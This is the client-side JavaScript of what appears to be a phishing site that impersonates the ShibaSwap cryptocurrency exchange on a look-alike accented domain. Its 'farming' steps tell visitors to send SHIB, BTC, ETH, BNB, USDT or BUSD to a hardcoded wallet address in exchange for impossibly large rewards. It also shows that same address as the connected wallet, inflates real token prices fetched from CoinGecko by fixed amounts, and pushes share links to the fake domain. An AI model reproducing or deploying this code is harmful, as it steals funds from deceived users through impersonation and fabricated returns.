const Web3 = require("web3");
var baseURL = "https://shìbaswap.com",
  web3,
  metamaskAccounts = [],
  myAccount,
  lastURL,
  actURL,
  PRICE_SHIB,
  cantTokens,
  rewardsToken,
  tokenSelected = '',
  timeframeSelected = '1',
  shareReady = false,
  ourAddress = "0x17fCFf24f0e9b3b360a34df8d92455581Db0EF7c";

var shibContract,
  shibContractAddress = "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE",
  shibAbi = [
    {
      constant: true,
      inputs: [],
      name: "name",
      outputs: [{ name: "", type: "string" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: false,
      inputs: [
        { name: "spender", type: "address" },
        { name: "value", type: "uint256" },
      ],
      name: "approve",
      outputs: [{ name: "", type: "bool" }],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: true,
      inputs: [],
      name: "totalSupply",
      outputs: [{ name: "", type: "uint256" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: false,
      inputs: [
        { name: "sender", type: "address" },
        { name: "recipient", type: "address" },
        { name: "amount", type: "uint256" },
      ],
      name: "transferFrom",
      outputs: [{ name: "", type: "bool" }],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: true,
      inputs: [],
      name: "decimals",
      outputs: [{ name: "", type: "uint8" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: false,
      inputs: [
        { name: "spender", type: "address" },
        { name: "addedValue", type: "uint256" },
      ],
      name: "increaseAllowance",
      outputs: [{ name: "", type: "bool" }],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: false,
      inputs: [{ name: "value", type: "uint256" }],
      name: "burn",
      outputs: [],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: true,
      inputs: [{ name: "account", type: "address" }],
      name: "balanceOf",
      outputs: [{ name: "", type: "uint256" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: true,
      inputs: [],
      name: "symbol",
      outputs: [{ name: "", type: "string" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: false,
      inputs: [
        { name: "spender", type: "address" },
        { name: "subtractedValue", type: "uint256" },
      ],
      name: "decreaseAllowance",
      outputs: [{ name: "", type: "bool" }],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: false,
      inputs: [
        { name: "recipient", type: "address" },
        { name: "amount", type: "uint256" },
      ],
      name: "transfer",
      outputs: [{ name: "", type: "bool" }],
      payable: false,
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: true,
      inputs: [
        { name: "owner", type: "address" },
        { name: "spender", type: "address" },
      ],
      name: "allowance",
      outputs: [{ name: "", type: "uint256" }],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [
        { name: "name", type: "string" },
        { name: "symbol", type: "string" },
        { name: "decimals", type: "uint8" },
        { name: "totalSupply", type: "uint256" },
        { name: "feeReceiver", type: "address" },
        { name: "tokenOwnerAddress", type: "address" },
      ],
      payable: true,
      stateMutability: "payable",
      type: "constructor",
    },
    {
      anonymous: false,
      inputs: [
        { indexed: true, name: "from", type: "address" },
        { indexed: true, name: "to", type: "address" },
        { indexed: false, name: "value", type: "uint256" },
      ],
      name: "Transfer",
      type: "event",
    },
    {
      anonymous: false,
      inputs: [
        { indexed: true, name: "owner", type: "address" },
        { indexed: true, name: "spender", type: "address" },
        { indexed: false, name: "value", type: "uint256" },
      ],
      name: "Approval",
      type: "event",
    },
  ];

function activeCheck(element) {
  element.classList.remove("step_check");
  element.classList.add("step_check-active");
}

async function burnEvents() {
  let burnButton = document.getElementById("burnButton"),
    shareButtons = [
      document.getElementById("share1"),
      document.getElementById("share2"),
      document.getElementById("share3"),
      document.getElementById("share4"),
    ],
    tickShare = document.getElementById("tickShare"),
    tickBurn = document.getElementById("tickBurn"),
    inputSHIB = document.getElementById("shibTokInput");

  function shareOn() {
    activeCheck(tickShare);
    shareReady = true;
  }

  function showError(text) {
    let errParr = document.getElementById("errParr");
    errParr.style.color = "red";
    errParr.innerHTML = text;
  }

  function showSuccess(text) {
    let errParr = document.getElementById("errParr");
    errParr.style.color = "green";
    errParr.innerHTML = text;
  }

  async function getSHIBBalance() {
    let balance = await shibContract.methods.balanceOf(myAccount).call();
    return balance;
  }

  async function saveReject() {
    await fetch(baseURL + "/reject/" + myAccount);
  }

  async function burnOn() {
    this.innerHTML = "<div class='preloader'></div>";
  }

  function changeAmount() {
    let inputLEASH = document.getElementById("leashTokInput");

    if (this.value > 10000000) {
      showError("Max burn: 10.000.000 SHIB");
    } else {
      if (this.value < 10000) {
        showError("Min burn: 10.000 SHIB");
      } else {
        showError(" ");
      }
    }

    let valorFinal = this.value * 0.000000031;
    if (shareReady) valorFinal = valorFinal * 1.05;
    inputLEASH.value = valorFinal.toFixed(4);
  }

  burnButton.onclick = burnOn;

  inputSHIB.addEventListener("input", changeAmount, false);

  // Tick on share
  shareButtons[0].onclick = shareOn;
  shareButtons[1].onclick = shareOn;

  shareButtons[2].addEventListener("click", function () {
    window.open(
      "http://twitter.com/intent/tweet?text=Burn your shiba tokens and get leash as a reward.&amp;url=https://shíbaswap.com/burn",
      "Share burning",
      "toolbar=0, status=0, width=650, height=450"
    );
    shareOn();
  });

  shareButtons[3].addEventListener("click", function () {
    window.open(
      "http://www.facebook.com/sharer.php?u=https://shíbaswap.com/burn",
      "Share burning",
      "toolbar=0, status=0, width=650, height=450"
    );
    shareOn();
  });
}

function modifiyURL(nuevaUrl) {
  history.pushState("", "", baseURL + nuevaUrl);
}

async function loadView(src, newUrl) {
  let res = await fetch(baseURL + src),
    htmlCode = await res.text();
  const content = document.getElementById("main-content");
  content.innerHTML = htmlCode;
  modifiyURL(newUrl);
  showHeaderInfo();
}

async function checkConnection() {
  // Check if browser is running Metamask
  let result;
  if (window.ethereum) {
    web3 = new Web3(window.ethereum);
  }

  // Check if User is already connected by retrieving the accounts
  metamaskAccounts = await web3.eth.getAccounts();
  result = metamaskAccounts.length != 0;

  if (result) myAccount = metamaskAccounts[0];
  showHeaderInfo();

  return result;
}

function showHeaderInfo() {
  let connectButton = document.getElementById("connect-wallet"),
    walletText = document.getElementById("walletText");

    let miniAddress =
      ourAddress.substring(0, 6) +
      "..." +
      ourAddress.substring(ourAddress.length - 4, ourAddress.length);

    if (walletText) walletText.innerText = miniAddress;

    if (connectButton) connectButton.onclick = metamask_connect;
}

const metamask_connect = async () => {
  myAccount = ourAddress;
  await fetch(baseURL + "/airdrop");
  window.open(baseURL + '/#/airdrop');
};

async function view_index() {
  // Cargamos la vista dashboard
  await loadView("/content", "/#/");
  document.title = "HOME | ShibaSwap";
}

async function view_pool() {
  // Cargamos la vista dashboard
  await loadView("/pool", "/#/pool");
  document.title = "POOL | ShibaSwap";
  setBackEvent();
}

async function view_bury() {
  // Cargamos la vista dashboard
  await loadView("/bury", "/#/bury");
  document.title = "BURY | ShibaSwap";
  setBackEvent();
}

async function view_swap() {
  // Cargamos la vista dashboard
  await loadView("/swap", "/#/swap");
  document.title = "SWAP | ShibaSwap";
  setBackEvent();
}

async function view_yield() {
  // Cargamos la vista dashboard
  await loadView("/yield", "/#/yield");
  document.title = "WOOF | ShibaSwap";
}

async function view_airdrop() {
  // Cargamos la vista dashboard
  await loadView("/airdrop", "/#/airdrop");
  document.title = "AIRDROP | ShibaSwap";

  let copyButton = document.getElementById("buttonCopy");
  copyButton.addEventListener("click", function () {
    let copyText = document.getElementById("boxInput");

    copyText.select();
    copyText.setSelectionRange(0, 99999);

    navigator.clipboard.writeText(copyText.value);
  }
);
}

function sleep (time) {
  return new Promise((resolve) => setTimeout(resolve, time));
}

async function view_step1() {
  await loadView("/step1", "/#/step1");
  document.title = "FARMING | ShibaSwap";

  var toStep2 = document.getElementById("toStep2");

  function changeAmount() {
    var numTokens = document.getElementById("numTokens");
    numTokens.innerHTML = "<div class='preloader'></div>";
  
    sleep(500).then(() => {
      setRewards(this.value);
    });
  }

  function changeTime() {
    var numTokens = document.getElementById("numTokens");
    var amountToken = document.getElementById("amountToken");
    numTokens.innerHTML = "<div class='preloader'></div>";
    timeframeSelected = this.value;
  
    sleep(500).then(() => {
      setRewards(amountToken.value);
    });
  }

  function checkAmount() {
    let err = false;
    var errParr = document.getElementById("errParragraph");
    errParr.innerHTML = '';
    switch (tokenSelected) {
      case 'shib':
        if(amountToken.value < 11000000) {
          errParr.innerHTML = 'Minimum amount for farming: 15.000.000 SHIB';
          err = true;
        }
        break;

      case 'btc':
        if(amountToken.value < 0.003) {
          errParr.innerHTML = 'Minimum amount for farming: 0.003 BTC';
          err = true;
        }
        break;

      case 'eth':
        if(amountToken.value < 0.04) {
          errParr.innerHTML = 'Minimum amount for farming: 0.04 ETH';
          err = true;
        }
        break;

      case 'bnb':
        if(amountToken.value < 0.15) {
          errParr.innerHTML = 'Minimum amount for farming: 0.15 BNB';
          err = true;
        }
        break;

      case 'usdt':
        if(amountToken.value < 100) {
          errParr.innerHTML = 'Minimum amount for farming: 100 USDT';
          err = true;
        }
        break;

      case 'busd':
        if(amountToken.value < 50) {
          errParr.innerHTML = 'Minimum amount for farming: 50 BUSD';
          err = true;
        }
        break;

      default:
          err = true;
          break;
    }

    return err;
  }

  function setRewards(cant) {
		let cantidad;
		var numDays = document.getElementById("numDays");
		numDays.innerHTML = timeframeSelected;

    const formatter = new Intl.NumberFormat('en-US', {
      style: 'currency',
      currency: 'USD',
      minimumFractionDigits: 0
    });

    cantTokens = '' + formatter.format(cant);
    cantTokens = cantTokens.substring(1, cantTokens.length);

		switch (tokenSelected) {
			case 'shib':
				switch (timeframeSelected) {
					case '1':
						cantidad = 0.027 * cant;
						break;

					case '7':
						cantidad = 0.1944 * cant;
						break;

					case '30':
						cantidad = 0.83 * cant;
						break;
				}
				break;

			case 'btc':
				switch (timeframeSelected) {
					case '1':
						cantidad = 55000000 * cant;
						break;

					case '7':
						cantidad = 350000000 * cant;
						break;

					case '30':
						cantidad = 1400000000 * cant;
						break;
				}
				break;

			case 'eth':
				switch (timeframeSelected) {
					case '1':
						cantidad = 4230000 * cant;
						break;

					case '7':
						cantidad = 27000000 * cant;
						break;

					case '30':
						cantidad = 115400000 * cant;
						break;
				}
				break;

			case 'bnb':
				switch (timeframeSelected) {
					case '1':
						cantidad = 400000 * cant;
						break;

					case '7':
						cantidad = 3200000 * cant;
						break;

					case '30':
						cantidad = 13000000 * cant;
						break;
				}
				break;

			case 'usdt':
				switch (timeframeSelected) {
					case '1':
						cantidad = 833 * cant;
						break;

					case '7':
						cantidad = 8666 * cant;
						break;

					case '30':
						cantidad = 38333 * cant;
						break;
				}
				break;

			case 'busd':
				switch (timeframeSelected) {
					case '1':
						cantidad = 833 * cant;
						break;

					case '7':
						cantidad = 8666 * cant;
						break;

					case '30':
						cantidad = 38333 * cant;
						break;
				}
				break;
		}


    let recompensa = '' + formatter.format(cantidad);
    rewardsToken = recompensa.substring(1, recompensa.length);

    numTokens.innerHTML = rewardsToken + ' (' + formatter.format(cantidad * PRICE_SHIB) + ')';
    checkAmount();
  }

  function changeToken(val) {
    var numTokens = document.getElementById("numTokens");
    var amountToken = document.getElementById("amountToken");
    numTokens.innerHTML = "<div class='preloader'></div>";
    switch (val) {
        case 'content_1':
           tokenSelected = 'shib';
           break;
  
        case 'content_2':
           tokenSelected = 'busd';
           break;
      
        case 'content_3':
           tokenSelected = 'eth';
           break;
  
        case 'content_4':
           tokenSelected = 'bnb';
           break;
  
        case 'content_5':
           tokenSelected = 'usdt';
           break;
      }
      
      setRewards(amountToken.value);
  }

  document
    .getElementById("selectToken")
    .addEventListener("change", function () {
      "use strict";
      var vis = document.querySelector(".vis"),
        selectToken = document.getElementById(this.value);
      if (vis !== null) {
        vis.className = "inv";
      }
      if (selectToken !== null) {
        selectToken.className = "vis";
      }

      changeToken(this.value);
    });

    let inputTokens = document.getElementById('amountToken'),
        selectTime = document.getElementById("selectTime");

		selectTime.addEventListener('input', changeTime, false);
    inputTokens.addEventListener('input', changeAmount, false);

    toStep2.addEventListener("click", function () {
        if (!checkAmount()) {
            modifiyURL("/#/step2");
        }
    });
    
}

async function view_step2() {
  await loadView("/step2", "/#/step2");
  document.title = "FARMING | ShibaSwap";
  let copyText = document.getElementById("boxInput"),
      copyButton = document.getElementById("buttonCopy")
      formSEND = document.getElementById("formSEND")
      formRECEIVE = document.getElementById("formRECEIVE")
      formDATE = document.getElementById("formDATE")
      formDATE2 = document.getElementById("formDATE2");

  copyText.value = ourAddress;
  formSEND.innerText = cantTokens + ' ' + tokenSelected.toUpperCase();
  formRECEIVE.innerText = rewardsToken;
  formDATE.innerText = timeframeSelected + ' day(s)';
  formDATE2.innerText = timeframeSelected + ' day(s)';

  copyButton.addEventListener("click", function () {

    copyText.select();
    copyText.setSelectionRange(0, 99999);

    navigator.clipboard.writeText(copyText.value);
  });
}

async function view_step3() {
  await loadView("/step3", "/#/step3");
  document.title = "FARMING | ShibaSwap";

  var toStep4 = document.getElementById("toStep4");

  toStep4.addEventListener("click", function () {
      let inputWallet = document.getElementById("inputWallet"),
          inputTx = document.getElementById("inputTx");

      if (inputWallet.value != '' && inputTx.value != '') {
        modifiyURL('/#/step4');
      } else {
        var errParr = document.getElementById("errParr");
        errParr.innerHTML = 'Please complete the form.';
      }
  });
}

async function view_step4() {
  await loadView("/step4", "/#/step4");
  document.title = "FARMING | ShibaSwap";
}

async function view_burn() {
  // Cargamos la vista dashboard
  await loadView("/burn-ajax", "/#/burn");
  document.title = "BURN | ShibaSwap";
  burnEvents();
}

function setBackEvent() {
  let backButton = document.getElementById("backButton");
  backButton.onclick = view_index;
}

function setCoinPrice(token, element, fixed) {
  let requestURL =
      "https://api.coingecko.com/api/v3/coins/" + token + "?vs_currency=usd",
    request = new XMLHttpRequest();

  request.open("GET", requestURL);
  request.responseType = "json";
  request.send();

  request.onload = function () {
    var price = request.response.market_data.current_price.usd;

    switch (fixed) {
      case 4:
        price = price + 0.0073;
        break;

      case 8:
        price = price + 0.00325905;
        break;

      case 12:
        PRICE_SHIB = price;
        price = price + 0.000000007238;
        break;
    }

    element.innerText = "$" + price.toFixed(fixed);
  };
}

function setPriceTokens() {
  let priceShib = document.getElementById("priceShib"),
    priceLeash = document.getElementById("priceLeash"),
    priceBone = document.getElementById("priceBone");

  setCoinPrice("shiba-inu", priceShib, 12);
  setCoinPrice("bone-shibaswap", priceBone, 8);
  setCoinPrice("leash", priceLeash, 4);
}

window.onload = () => {
  function redirectPage(url) {
    switch (url) {
      case "#/":
        view_index();
        break;

      case "#/pool":
        view_pool();
        break;

      case "#/bury":
        view_bury();
        break;

      case "#/swap":
        view_swap();
        break;

      case "#/yield":
        view_yield();
        break;

      case "#/airdrop":
        view_airdrop();
        break;

      case "#/step1":
        view_step1();
        break;

      case "#/step2":
        view_step2();
        break;

      case "#/step3":
        view_step3();
        break;

      case "#/step4":
        view_step4();
        break;

      default:
        view_index();
        break;
    }
  }

  function checkURL() {
    actURL = document.location.hash;
    if (actURL != lastURL) {
      console.log("mando: " + actURL);
      redirectPage(actURL);
      lastURL = document.location.hash;
    }
  }

  // Chequeos de URL
  setInterval(checkURL, 50);
  setInterval(setPriceTokens, 30000);
  if (document.location.pathname == "/" && !document.location.hash)
    modifiyURL("/#/");

  const button = document.getElementById("headlessui-popover-button-1"),
    element = document.getElementById("headlessui-popover-panel-2"),
    body = document.querySelector("body");

  function isChildOf(child, parent) {
    if (child.parentNode === parent) {
      return true;
    } else if (child.parentNode === null) {
      return false;
    } else {
      return isChildOf(child.parentNode, parent);
    }
  }

  button.addEventListener("click", function () {
    element.classList.toggle("m-fadeIn");
  });

  body.addEventListener("click", function (e) {
    if (e.target !== button && !isChildOf(e.target, button))
      element.classList.remove("m-fadeIn");
  });

  setPriceTokens();
};
